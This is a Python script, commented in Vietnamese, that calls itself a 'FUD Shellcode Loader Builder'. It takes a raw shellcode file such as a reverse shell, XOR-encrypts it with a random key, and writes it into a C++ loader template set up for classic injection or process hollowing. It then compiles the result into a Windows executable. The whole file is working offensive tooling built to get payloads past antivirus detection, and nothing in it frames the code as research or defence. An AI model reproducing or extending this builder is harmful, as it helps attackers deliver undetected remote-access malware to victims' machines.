import argparse
import subprocess
import os
import random
import string

# Hàm để chuyển shellcode binary thành mảng byte C++
def format_shellcode(data):
    return "{" + ", ".join([f"0x{byte:02x}" for byte in data]) + "};"

# Hàm để tạo khóa ngẫu nhiên
def generate_random_key(length=16):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

# Hàm tạo file mã nguồn C++
def generate_cpp_source(shellcode_data, key, options):
    # Đọc template từ file main.cpp
    with open('src/main.cpp', 'r') as f:
        template = f.read()

    # Thêm các #define dựa trên lựa chọn
    defines = []
    if options.get('encryption') == 'xor':
        defines.append("#define ENCRYPTION_XOR")
    if options.get('injection') == 'classic':
        defines.append("#define INJECTION_CLASSIC")
    if options.get('debug'):
        defines.append("#define DEBUG_MODE")
    # ... Thêm các define khác ở đây sau này

    # Thay thế các placeholder trong template
    code = template.replace("/*{{DEFINES}}*/", "\n".join(defines))
    code = code.replace("/*{{SHELLCODE}}*/", format_shellcode(shellcode_data))
    code = code.replace("/*{{SHELLCODE_LEN}}*/", str(len(shellcode_data)))
    code = code.replace("/*{{KEY}}*/", f'"{key}"')

    # Ghi ra file build tạm thời
    build_path = 'build/generated_loader.cpp'
    with open(build_path, 'w') as f:
        f.write(code)
    print(f"[+] Generated C++ source at: {build_path}")
    return build_path


def main():
    parser = argparse.ArgumentParser(description="FUD Shellcode Loader Builder")
    parser.add_argument("-s", "--shellcode", required=True, help="Path to the raw shellcode file (e.g., revshell.bin)")
    parser.add_argument("-o", "--output", required=True, help="Output executable name (e.g., payload.exe)")
    parser.add_argument("-e", "--encryption", default="xor", choices=["none", "xor", "aes"], help="Encryption method")
    parser.add_argument("-i", "--injection", default="classic", choices=["classic", "hollowing"], help="Injection technique")

    parser.add_argument("--debug", action="store_true", help="Enable debug mode with MessageBox popups")

    args = parser.parse_args()

    # 1. Đọc shellcode
    try:
        with open(args.shellcode, 'rb') as f:
            shellcode = f.read()
            print(f"[+] Read {len(shellcode)} bytes from {args.shellcode}")
    except FileNotFoundError:
        print(f"[!] Error: Shellcode file not found at {args.shellcode}")
        return

    # 2. Mã hóa shellcode (nếu có)
    key = generate_random_key()
    if args.encryption == 'xor':
        print(f"[+] Encrypting with XOR using key: {key}")
        encoded_shellcode = bytearray()
        for i, byte in enumerate(shellcode):
            encoded_shellcode.append(byte ^ ord(key[i % len(key)]))
        shellcode = encoded_shellcode
    
    # 3. Tạo file C++
    options = {'encryption': args.encryption, 'injection': args.injection, 'debug': args.debug}
    source_file = generate_cpp_source(shellcode, key, options)

    # 4. Biên dịch bằng make
    print(f"[+] Compiling with make...")
    try:
        output_filename = os.path.basename(args.output)

        # Cấu trúc lệnh: make build SRC=<tên file nguồn> OUT=<tên file output>
        subprocess.run(
            ["make", "build", f"SRC={os.path.basename(source_file)}", f"OUT={output_filename}"],
            check=True,
            capture_output=True,
            text=True
        )
    except subprocess.CalledProcessError as e:
        print("[!] Compilation failed!")
        print(e.stderr)
    except FileNotFoundError:
        print("[!] Error: 'make' command not found. Is MinGW-w64 in your system's PATH?")


if __name__ == "__main__":
    # Tạo các thư mục nếu chưa có
    os.makedirs('build', exist_ok=True)
    os.makedirs('output', exist_ok=True)
    main()